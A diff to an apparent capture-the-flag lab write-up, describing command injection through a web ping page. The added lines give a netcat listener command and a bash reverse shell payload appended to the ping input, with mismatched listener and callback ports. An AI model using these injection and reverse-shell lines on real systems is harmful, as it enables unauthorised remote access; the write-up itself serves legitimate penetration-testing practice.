@@ -58,10 +58,15 @@ Awesome, now we can probably use this ping page to get a shell into the actual m
 First i typed an IP `127.0.0.1` into the field and got a pretty generic response. 
 Sure that it was pinging, I tried to see if I could piggyback on that ping command using the semicolon
 
-So I pinned a Print Working Directory command the end of that local host ping `127.0.0.1;pwd` and got something better.
+So I pinned a Print Working Directory command to the end of that local host ping `127.0.0.1;pwd` and got something much better.
 
 ![S](Images/Localpwd.png)
 
+From here it was just a matter of making this machine (target) call back to my (attacker) machine.
+As always I set up a netcat listener on my (attacker) machine using the command `nc -lvnp 7777` and then I went over to pentestmonkey.net 's reverse shell cheatsheet where I got the bash reverse shell.
+
+When appended to the end of the localhost ping, the final command looked like this: 
+`127.0.0.1;bash -i >& /dev/tcp/10.0.0.0/4444 0>&1`
 
 
 ## Box 2
